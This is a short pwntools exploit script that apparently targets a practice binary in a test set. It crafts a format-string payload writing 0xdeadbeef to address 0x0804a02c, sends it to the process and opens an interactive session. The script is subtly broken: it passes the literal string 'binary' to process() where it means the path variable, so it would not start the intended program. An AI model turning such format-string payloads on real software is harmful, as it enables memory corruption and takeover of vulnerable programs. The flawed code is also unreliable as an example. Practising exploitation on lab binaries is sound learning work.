from pwn import *
binary = "/home/condor0010/ace-binaries/test-binaries/bin-printf_read_var-0"

# Define the target process or binary
target = process('binary')

# Craft the format string payload
payload = fmtstr_payload(offset=6, writes={0x0804a02c: 0xdeadbeef})

# Send the payload
target.sendline(payload)

# Interact with the process
target.interactive()

